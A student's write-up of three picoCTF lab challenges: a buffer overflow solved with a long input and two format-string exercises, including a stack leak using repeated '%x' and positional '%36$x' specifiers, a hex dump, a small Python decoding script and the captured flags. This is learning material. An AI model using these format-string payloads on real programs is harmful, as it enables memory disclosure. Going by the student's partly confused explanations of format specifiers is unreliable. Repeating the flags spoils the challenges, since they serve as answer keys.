## buffer overflow 0

Flag: ```picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}```
Hints used: NONE

in this chal, i gave a long string as an input ```11111111111111111111111111``` which gave me the flag. 
giving an input of ```111``` exited the program. however, when i inputted ```aaaaaaaaaaaaaaaaaaaaaaaaaaaa``` there 
was no output, and i had to press ```enter``` to exit the code.

after looking at the source code, there was a vulnerability for char greater than 16, however entering 17 chars didnt give me the flag, it took 20 chars to get the flag.
tried to understand the code but since i dont know c properly(skill issue), i cant really decode the script.

## format string 0

Flag: ```picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}```
Hints used: NONE

the obvious choices were the ones with ```%``` in them, since they're used to format strings/output in C.
however after looking at the source_code, things made more sense.
in the first problem, input needs to have integers more than the buffer size set(32 bits)
```count > 2 * BUFSIZE```, since 1 int == 32 bits and ```Gr%114d_Cheese``` has 3 integers, that passes the value.
in the second problem, it is just looking for an integer formatting style, ie ```%s```, so ```Cla%sic_Che%s%steak``` gives me the flag.

qn for the mentor: why did the program return ```ClaCla%sic_Che%s%steakic_Che(null)``` in the end?

attaching the image for reference.

![alt text](/assets/format_tp2.png)

## flag-leak

Flag: ```picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}```

Hints used: Youtube

This was by far, the hardest challenge i came across in all of the mandatory challenges.

In the code(vuln.c), line 32 => ```printf(story);```, there is a string formatting vulnerablilty, which means if i give an % identifier input, i can see everything on the stack.

So i made a python file wherein i made little tweaks, to give a proper input in the .c code.

I gave an input of 32 ```%x.``` and got an output of ```ffebc810.ffebc830.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.252e78.6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.```



then i split the output using python(```ffebc810 ffebc830 8049346 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 78252e78 2e78252e 252e7825 252e78 6f636970 7b465443 6b34334c 5f676e31 67346c46 6666305f 3474535f ```)
i converted ```6f636970 7b465443 6b34334c 5f676e31 67346c46 6666305f 3474535f``` because that is where the hex code changes.

output=>
![output](/assets/flag_leak1.png)

since this is just half the flag, i counted the number from where the hex coded changed, which was 36.

therefore i wrote another script for giving the input as ```%36$x.%37$x......``` and so on.

from there, i got an output ```%36$x.%37$x.%38$x.%39$x.%40$x.%41$x.%42$x.%43$x.%44$x.%45$x.617}5f60ck_9_St4_0ffFl4g1ng_L34kCTF{pico``` which when reversed, although took some manual work, gave me the flag.

here is the python code i wrote to automate some of the tasks.
![code](/TP_2/chal_assets/trial.py)

```
lst = "ffebc810.ffebc830.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.252e78.6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.".split('.')

s = ' '.join(lst)

print(s)

for i in range(36,46):
    x = '%'+str(i)+'$x'
    print(x, end='.') 


flag = 'ocip{FTCk43L_gn1g4lFff0_4tS_9_kc06f5}716'[::-1]

print(flag)

'5f60ck_9_St4_0ffFl4g1ng_L34kCTF{pico'
'picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}'
```





